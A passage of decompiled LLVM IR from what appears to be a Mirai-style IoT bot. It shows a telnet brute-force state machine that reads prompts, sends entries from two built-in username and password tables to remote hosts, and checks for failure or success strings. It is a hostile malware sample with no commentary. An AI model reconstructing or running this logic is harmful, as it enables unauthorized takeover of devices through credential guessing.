  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b89c = load i32, i32* %v1_b800, align 4
  %v1_b8a0 = add i32 %v2_b89c, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  store i32 %v2_b7ac, i32* %ip.global-to-local, align 4
  %v1_b8ac = load i32, i32* @sp, align 4
  %v2_b8ac = inttoptr i32 %v1_b8ac to i32*
  store i32 %v2_b8a8, i32* %v2_b8ac, align 4
  %v0_b8b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b7ac, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_b8c0 = load i32, i32* %stack_var_-332, align 4
  %v5_b8c0 = call i32 @__libc_select(i32 %v0_b8b0, i32 0, i32 %v2_b7ac, i32 0, i32 %v4_b8c0)
  store i32 %v5_b8c0, i32* %r3.global-to-local, align 4
  %v7_b8d0 = icmp eq i32 %v5_b8c0, 1
  br i1 %v7_b8d0, label %dec_label_pc_b8d8, label %dec_label_pc_b9dc

dec_label_pc_b8d8:                                ; preds = %dec_label_pc_b7e8
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b900 = load i32, i32* %v1_b800, align 4
  store i32 %v2_b900, i32* %r2.global-to-local, align 4
  store i32 %v2_b904, i32* %ip.global-to-local, align 4
  %v1_b90c = load i32, i32* @sp, align 4
  %v2_b90c = inttoptr i32 %v1_b90c to i32*
  store i32 %v2_b908, i32* %v2_b90c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_b904, i32* %r3.global-to-local, align 4
  %v0_b920 = call i32 @getsockopt()
  %v3_b924 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_b924, i32* %r3.global-to-local, align 4
  %v2_b928 = icmp eq i32 %v3_b924, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  br i1 %v2_b928, label %dec_label_pc_b954, label %dec_label_pc_b930

dec_label_pc_b930:                                ; preds = %dec_label_pc_b8d8
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b94c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_b954:                                ; preds = %dec_label_pc_b8d8
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b96c = load i32, i32* %v1_b800, align 4
  store i32 %v2_b96c, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_b988 = load i32, i32* %v1_b800, align 4
  store i32 %v2_b988, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b998 = call i32 @__libc_fcntl(i32 %v2_b988, i32 3)
  %v1_b9a0 = and i32 %v2_b998, -2049
  store i32 %v1_b9a0, i32* %r3.global-to-local, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v1_b9a0, i32* @r2, align 4
  %v2_b9b0 = call i32 @__libc_fcntl(i32 %v0_b9a4, i32 4)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_b9d4 = call i32 @advance_state(i32* nonnull %v1_b800, i32 2)
  br label %dec_label_pc_c420

dec_label_pc_b9dc:                                ; preds = %dec_label_pc_b7e8
  store i32 %v5_b8c0, i32* %r3.global-to-local, align 4
  %v3_b9e0 = icmp eq i32 %v5_b8c0, -1
  br i1 %v3_b9e0, label %dec_label_pc_b9e8, label %dec_label_pc_ba0c

dec_label_pc_b9e8:                                ; preds = %dec_label_pc_b9dc
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_ba04 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9dc
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_ba28 = add i32 %v2_b308, %v2_ba24
  store i32 %v2_ba28, i32* %r3.global-to-local, align 4
  %v1_ba2c = inttoptr i32 %v2_ba28 to i32*
  %v2_ba2c = load i32, i32* %v1_ba2c, align 4
  store i32 %v2_ba2c, i32* %r3.global-to-local, align 4
  %v1_ba30 = add i32 %v2_ba2c, 5
  store i32 %v1_ba30, i32* @r4, align 4
  %v2_ba38 = call i32 @__GI_time(i32* null)
  store i32 %v2_ba38, i32* %r3.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r4, align 4
  %v3_ba40 = icmp ult i32 %v0_ba40, %v2_ba38
  br i1 %v3_ba40, label %dec_label_pc_ba48, label %dec_label_pc_c420

dec_label_pc_ba48:                                ; preds = %dec_label_pc_ba0c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_ba64 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_ba6c:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_ba84 = inttoptr i32 %v2_b30c to i32*
  %v2_ba84 = load i32, i32* %v1_ba84, align 4
  store i32 %v2_ba84, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_baa4 = add i32 %v2_b308, %v2_baa0
  store i32 %v2_baa4, i32* %r3.global-to-local, align 4
  %v1_baa8 = inttoptr i32 %v2_baa4 to i32*
  %v2_baa8 = load i32, i32* %v1_baa8, align 4
  store i32 %v2_baa8, i32* %r2.global-to-local, align 4
  %v1_bab0 = load i32, i32* @sp, align 4
  %v2_bab0 = inttoptr i32 %v1_bab0 to i32*
  store i32 ptrtoint (i32* @global_var_23730 to i32), i32* %v2_bab0, align 4
  %v0_bab4 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bac0 = inttoptr i32 %v2_baa8 to i8*
  %v5_bac0 = call i32 @read_until_response(i32 %v0_bab4, i32 %arg1, i8* %v4_bac0, i32 1024)
  %v2_bac8 = icmp eq i32 %v5_bac0, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bac8, label %dec_label_pc_bb58, label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_ba6c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_baec = add i32 %v2_b30c, 24
  store i32 %v2_baec, i32* %r3.global-to-local, align 4
  %v1_baf0 = inttoptr i32 %v2_baec to i32*
  %v2_baf0 = load i32, i32* %v1_baf0, align 4
  store i32 %v2_baf0, i32* %r3.global-to-local, align 4
  %v1_baf8 = call i32 @contains_fail(i32 %v2_baf0)
  %v2_bb00 = icmp eq i32 %v1_baf8, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v2_bb00, label %dec_label_pc_bb30, label %dec_label_pc_bb08

dec_label_pc_bb08:                                ; preds = %dec_label_pc_bad0
  %v3_bb28 = call i32 @advance_state(i32* %v1_ba84, i32 0)
  br label %dec_label_pc_c420

dec_label_pc_bb30:                                ; preds = %dec_label_pc_bad0
  %v3_bb50 = call i32 @advance_state(i32* %v1_ba84, i32 3)
  br label %dec_label_pc_c420

dec_label_pc_bb58:                                ; preds = %dec_label_pc_ba6c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b310, i32* %r3.global-to-local, align 4
  %v2_bb78 = load i32, i32* %v1_b314, align 4
  store i32 %v2_bb78, i32* %r3.global-to-local, align 4
  %v1_bb7c = add i32 %v2_bb78, 7
  store i32 %v1_bb7c, i32* @r4, align 4
  %v2_bb84 = call i32 @__GI_time(i32* null)
  store i32 %v2_bb84, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v3_bb8c = icmp ult i32 %v0_bb8c, %v2_bb84
  br i1 %v3_bb8c, label %dec_label_pc_bb94, label %dec_label_pc_c420

dec_label_pc_bb94:                                ; preds = %dec_label_pc_bb58
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_bbb0 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_bbd0 = inttoptr i32 %v2_b30c to i32*
  %v2_bbd0 = load i32, i32* %v1_bbd0, align 4
  store i32 %v2_bbd0, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bbf0 = add i32 %v2_b30c, 8
  store i32 %v2_bbf0, i32* %r3.global-to-local, align 4
  %v1_bbf4 = add i32 %v2_b30c, 10
  %v2_bbf4 = inttoptr i32 %v1_bbf4 to i8*
  %v3_bbf4 = load i8, i8* %v2_bbf4, align 2
  %v4_bbf4 = zext i8 %v3_bbf4 to i32
  store i32 %v4_bbf4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32), i32* %r3.global-to-local, align 4
  %v4_bc00 = mul nuw nsw i32 %v4_bbf4, 4
  %v5_bc00 = add i32 %v4_bc00, ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32)
  %v6_bc00 = inttoptr i32 %v5_bc00 to i32*
  %v7_bc00 = load i32, i32* %v6_bc00, align 4
  store i32 %v7_bc00, i32* @r5, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_bbf0, i32* %r3.global-to-local, align 4
  %v3_bc24 = load i8, i8* %v2_bbf4, align 2
  %v4_bc24 = zext i8 %v3_bc24 to i32
  store i32 %v4_bc24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32), i32* %r3.global-to-local, align 4
  %v4_bc30 = mul nuw nsw i32 %v4_bc24, 4
  %v5_bc30 = add i32 %v4_bc30, ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32)
  %v6_bc30 = inttoptr i32 %v5_bc30 to i32*
  %v7_bc30 = load i32, i32* %v6_bc30, align 4
  store i32 %v7_bc30, i32* %r3.global-to-local, align 4
  %v1_bc34 = inttoptr i32 %v7_bc30 to i8*
  %v3_bc38 = call i32 @strlen(i8* %v1_bc34)
  %v0_bc40 = load i32, i32* @r4, align 4
  %v0_bc44 = load i32, i32* @r5, align 4
  store i32 %v3_bc38, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bc50 = inttoptr i32 %v0_bc44 to i32*
  %v5_bc50 = call i32 @__libc_send(i32 %v0_bc40, i32* %v4_bc50, i32 %v3_bc38, i32 16384)
  %v1_bc58 = icmp slt i32 %v5_bc50, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bc84

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bbb8
  %v3_bc7c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_bc84:                                ; preds = %dec_label_pc_bbb8
  %v2_bc9c = load i32, i32* %v1_bbd0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bcb0 = call i32 @__libc_send(i32 %v2_bc9c, i32* bitcast ([3 x i8]* @global_var_19454.372 to i32*), i32 2, i32 16384)
  %v1_bcb8 = icmp slt i32 %v6_bcb0, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bcb8, label %dec_label_pc_bcc0, label %dec_label_pc_bce4

dec_label_pc_bcc0:                                ; preds = %dec_label_pc_bc84
  %v3_bcdc = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_bce4:                                ; preds = %dec_label_pc_bc84
  %v3_bd04 = call i32 @advance_state(i32* nonnull %v1_bbd0, i32 4)
  br label %dec_label_pc_c420

dec_label_pc_bd0c:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_bd24 = inttoptr i32 %v2_b30c to i32*
  %v2_bd24 = load i32, i32* %v1_bd24, align 4
  store i32 %v2_bd24, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bd44 = add i32 %v2_b308, %v2_baa0
  store i32 %v2_bd44, i32* %r3.global-to-local, align 4
  %v1_bd48 = inttoptr i32 %v2_bd44 to i32*
  %v2_bd48 = load i32, i32* %v1_bd48, align 4
  store i32 %v2_bd48, i32* %r2.global-to-local, align 4
  %v1_bd50 = load i32, i32* @sp, align 4
  %v2_bd50 = inttoptr i32 %v1_bd50 to i32*
  store i32 ptrtoint (i32* @global_var_23730 to i32), i32* %v2_bd50, align 4
  %v0_bd54 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bd60 = inttoptr i32 %v2_bd48 to i8*
  %v5_bd60 = call i32 @read_until_response(i32 %v0_bd54, i32 %arg1, i8* %v4_bd60, i32 1024)
  %v2_bd68 = icmp eq i32 %v5_bd60, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bd68, label %dec_label_pc_bdf8, label %dec_label_pc_bd70

dec_label_pc_bd70:                                ; preds = %dec_label_pc_bd0c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bd8c = add i32 %v2_b30c, 24
  store i32 %v2_bd8c, i32* %r3.global-to-local, align 4
  %v1_bd90 = inttoptr i32 %v2_bd8c to i32*
  %v2_bd90 = load i32, i32* %v1_bd90, align 4
  store i32 %v2_bd90, i32* %r3.global-to-local, align 4
  %v1_bd98 = call i32 @contains_fail(i32 %v2_bd90)
  %v2_bda0 = icmp eq i32 %v1_bd98, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v2_bda0, label %dec_label_pc_bdd0, label %dec_label_pc_bda8

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bd70
  %v3_bdc8 = call i32 @advance_state(i32* %v1_bd24, i32 0)
  br label %dec_label_pc_c420

dec_label_pc_bdd0:                                ; preds = %dec_label_pc_bd70
  %v3_bdf0 = call i32 @advance_state(i32* %v1_bd24, i32 5)
  br label %dec_label_pc_c420

dec_label_pc_bdf8:                                ; preds = %dec_label_pc_bd0c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b310, i32* %r3.global-to-local, align 4
  %v2_be18 = load i32, i32* %v1_b314, align 4
  store i32 %v2_be18, i32* %r3.global-to-local, align 4
  %v1_be1c = add i32 %v2_be18, 3
  store i32 %v1_be1c, i32* @r4, align 4
  %v2_be24 = call i32 @__GI_time(i32* null)
  store i32 %v2_be24, i32* %r3.global-to-local, align 4
  %v0_be2c = load i32, i32* @r4, align 4
  %v3_be2c = icmp ult i32 %v0_be2c, %v2_be24
  br i1 %v3_be2c, label %dec_label_pc_be34, label %dec_label_pc_c420

dec_label_pc_be34:                                ; preds = %dec_label_pc_bdf8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_be50 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_be58:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_be70 = inttoptr i32 %v2_b30c to i32*
  %v2_be70 = load i32, i32* %v1_be70, align 4
  store i32 %v2_be70, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_be90 = add i32 %v2_b30c, 8
  store i32 %v2_be90, i32* %r3.global-to-local, align 4
  %v1_be94 = add i32 %v2_b30c, 11
  %v2_be94 = inttoptr i32 %v1_be94 to i8*
  %v3_be94 = load i8, i8* %v2_be94, align 1
  %v4_be94 = zext i8 %v3_be94 to i32
  store i32 %v4_be94, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32), i32* %r3.global-to-local, align 4
  %v4_bea0 = mul nuw nsw i32 %v4_be94, 4
  %v5_bea0 = add i32 %v4_bea0, ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32)
  %v6_bea0 = inttoptr i32 %v5_bea0 to i32*
  %v7_bea0 = load i32, i32* %v6_bea0, align 4
  store i32 %v7_bea0, i32* @r5, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_be90, i32* %r3.global-to-local, align 4
  %v3_bec4 = load i8, i8* %v2_be94, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v4_bec4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32), i32* %r3.global-to-local, align 4
  %v4_bed0 = mul nuw nsw i32 %v4_bec4, 4
  %v5_bed0 = add i32 %v4_bed0, ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32)
  %v6_bed0 = inttoptr i32 %v5_bed0 to i32*
  %v7_bed0 = load i32, i32* %v6_bed0, align 4
  store i32 %v7_bed0, i32* %r3.global-to-local, align 4
  %v1_bed4 = inttoptr i32 %v7_bed0 to i8*
  %v3_bed8 = call i32 @strlen(i8* %v1_bed4)
  %v0_bee0 = load i32, i32* @r4, align 4
  %v0_bee4 = load i32, i32* @r5, align 4
  store i32 %v3_bed8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bef0 = inttoptr i32 %v0_bee4 to i32*
  %v5_bef0 = call i32 @__libc_send(i32 %v0_bee0, i32* %v4_bef0, i32 %v3_bed8, i32 16384)
  %v1_bef8 = icmp slt i32 %v5_bef0, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bef8, label %dec_label_pc_bf00, label %dec_label_pc_bf24

dec_label_pc_bf00:                                ; preds = %dec_label_pc_be58
  %v3_bf1c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_bf24:                                ; preds = %dec_label_pc_be58
  %v2_bf3c = load i32, i32* %v1_be70, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bf50 = call i32 @__libc_send(i32 %v2_bf3c, i32* bitcast ([3 x i8]* @global_var_19454.372 to i32*), i32 2, i32 16384)
  %v1_bf58 = icmp slt i32 %v6_bf50, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bf58, label %dec_label_pc_bf60, label %dec_label_pc_bf84

dec_label_pc_bf60:                                ; preds = %dec_label_pc_bf24
  %v3_bf7c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf24
  %v3_bfa4 = call i32 @advance_state(i32* nonnull %v1_be70, i32 6)
  br label %dec_label_pc_c420

dec_label_pc_bfac:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_bfc4 = inttoptr i32 %v2_b30c to i32*
  %v2_bfc4 = load i32, i32* %v1_bfc4, align 4
  store i32 %v2_bfc4, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bfe4 = add i32 %v2_b308, %v2_baa0
  store i32 %v2_bfe4, i32* %r3.global-to-local, align 4
  %v1_bfe8 = inttoptr i32 %v2_bfe4 to i32*
  %v2_bfe8 = load i32, i32* %v1_bfe8, align 4
  store i32 %v2_bfe8, i32* %r2.global-to-local, align 4
  %v1_bff0 = load i32, i32* @sp, align 4
  %v2_bff0 = inttoptr i32 %v1_bff0 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_23774.376 to i32), i32* %v2_bff0, align 4
  %v0_bff4 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_c000 = inttoptr i32 %v2_bfe8 to i8*
  %v5_c000 = call i32 @read_until_response(i32 %v0_bff4, i32 %arg1, i8* %v4_c000, i32 1024)
  store i32 %v5_c000, i32* %r3.global-to-local, align 4
  %v2_c008 = icmp eq i32 %v5_c000, 0
  br i1 %v2_c008, label %dec_label_pc_c224, label %dec_label_pc_c010

dec_label_pc_c010:                                ; preds = %dec_label_pc_bfac
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c018 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c02c = load i32, i32* @r4, align 4
  %v2_c038 = mul i32 %v0_c02c, 28
  %v2_c040 = add i32 %v2_ba24, %v2_c038
  %v2_c044 = inttoptr i32 %v2_c040 to i32*
  store i32 %v2_c018, i32* %v2_c044, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_bfe4, i32* %r3.global-to-local, align 4
  %v2_c068 = load i32, i32* %v1_bfe8, align 4
  store i32 %v2_c068, i32* %r3.global-to-local, align 4
  %v1_c070 = call i32 @contains_fail(i32 %v2_c068)
  store i32 %v1_c070, i32* %r3.global-to-local, align 4
  %v2_c078 = icmp eq i32 %v1_c070, 0
  br i1 %v2_c078, label %dec_label_pc_c0a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c010
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c0a0 = call i32 @advance_state(i32* %v1_bfc4, i32 0)
  br label %dec_label_pc_c420

dec_label_pc_c0a8:                                ; preds = %dec_label_pc_c010
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_bfe4, i32* %r3.global-to-local, align 4
  %v2_c0c8 = load i32, i32* %v1_bfe8, align 4
  store i32 %v2_c0c8, i32* %r3.global-to-local, align 4
  %v1_c0d0 = call i32 @contains_success(i32 %v2_c0c8)
  store i32 %v1_c0d0, i32* %r3.global-to-local, align 4
  %v2_c0d8 = icmp eq i32 %v1_c0d0, 0
  br i1 %v2_c0d8, label %dec_label_pc_c200, label %dec_label_pc_c0e0

dec_label_pc_c0e0:                                ; preds = %dec_label_pc_c0a8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_c0fc = add i32 %v2_b30c, 8
  store i32 %v2_c0fc, i32* %r3.global-to-local, align 4
  %v1_c100 = add i32 %v2_b30c, 9
  %v2_c100 = inttoptr i32 %v1_c100 to i8*
  %v3_c100 = load i8, i8* %v2_c100, align 1
  %v4_c100 = zext i8 %v3_c100 to i32
  store i32 %v4_c100, i32* %r3.global-to-local, align 4
  %v7_c104 = icmp eq i8 %v3_c100, 2
  br i1 %v7_c104, label %dec_label_pc_c10c, label %dec_label_pc_c134

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c0e0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c12c = call i32 @advance_state(i32* %v1_bfc4, i32 7)
  br label %dec_label_pc_c420

dec_label_pc_c134:                                ; preds = %dec_label_pc_c0e0
  %v2_c138 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_c138, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c158 = call i32 @get_telstate_host(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  store i32 %v3_c158, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_c0fc, i32* %r3.global-to-local, align 4
  %v1_c180 = add i32 %v2_b30c, 10
  %v2_c180 = inttoptr i32 %v1_c180 to i8*
  %v3_c180 = load i8, i8* %v2_c180, align 2
  %v4_c180 = zext i8 %v3_c180 to i32
  store i32 %v4_c180, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32), i32* %r3.global-to-local, align 4
  %v4_c18c = mul nuw nsw i32 %v4_c180, 4
  %v5_c18c = add i32 %v4_c18c, ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32)
  %v6_c18c = inttoptr i32 %v5_c18c to i32*
  %v7_c18c = load i32, i32* %v6_c18c, align 4
  store i32 %v7_c18c, i32* @lr, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_c0fc, i32* %r3.global-to-local, align 4
  %v1_c1b0 = add i32 %v2_b30c, 11
  %v2_c1b0 = inttoptr i32 %v1_c1b0 to i8*
  %v3_c1b0 = load i8, i8* %v2_c1b0, align 1
  %v4_c1b0 = zext i8 %v3_c1b0 to i32
  store i32 %v4_c1b0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32), i32* %r3.global-to-local, align 4
  %v4_c1bc = mul nuw nsw i32 %v4_c1b0, 4
  %v5_c1bc = add i32 %v4_c1bc, ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32)
  %v6_c1bc = inttoptr i32 %v5_c1bc to i32*
  %v7_c1bc = load i32, i32* %v6_c1bc, align 4
  %v1_c1c0 = load i32, i32* @sp, align 4
  %v2_c1c0 = inttoptr i32 %v1_c1c0 to i32*
  store i32 %v7_c1bc, i32* %v2_c1c0, align 4
  %v0_c1c4 = load i32, i32* @r4, align 4
  %v0_c1cc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c1cc, i32* @r2, align 4
  %v0_c1d0 = load i32, i32* @lr, align 4
  store i32 %v0_c1d0, i32* %r3.global-to-local, align 4
  %v2_c1d4 = call i32 @Rootsprintf(i32 %v0_c1c4, i32 ptrtoint (i32* @global_var_19458.379 to i32))
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c1f8 = call i32 @advance_state(i32* %v1_bfc4, i32 7)
  br label %dec_label_pc_c420

dec_label_pc_c200:                                ; preds = %dec_label_pc_c0a8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c21c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_c224:                                ; preds = %dec_label_pc_bfac
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_c240 = add i32 %v2_b308, %v2_ba24
  store i32 %v2_c240, i32* %r3.global-to-local, align 4
  %v1_c244 = inttoptr i32 %v2_c240 to i32*
  %v2_c244 = load i32, i32* %v1_c244, align 4
  store i32 %v2_c244, i32* %r3.global-to-local, align 4
  %v1_c248 = add i32 %v2_c244, 7
  store i32 %v1_c248, i32* @r4, align 4
  %v2_c250 = call i32 @__GI_time(i32* null)
  store i32 %v2_c250, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  %v3_c258 = icmp ult i32 %v0_c258, %v2_c250
  br i1 %v3_c258, label %dec_label_pc_c260, label %dec_label_pc_c420

dec_label_pc_c260:                                ; preds = %dec_label_pc_c224
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c27c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_c2b0:                                ; preds = %dec_label_pc_b358
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c2b8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c2cc = load i32, i32* @r4, align 4
  %v2_c2d8 = mul i32 %v0_c2cc, 28
  %v2_c2e0 = add i32 %v2_ba24, %v2_c2d8
  %v2_c2e4 = inttoptr i32 %v2_c2e0 to i32*
  store i32 %v2_c2b8, i32* %v2_c2e4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_c300 = inttoptr i32 %v2_b30c to i32*
  %v2_c300 = load i32, i32* %v1_c300, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c314 = call i32 @__libc_send(i32 %v2_c300, i32* bitcast ([5 x i8]* @global_var_194b8.381 to i32*), i32 4, i32 16384)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
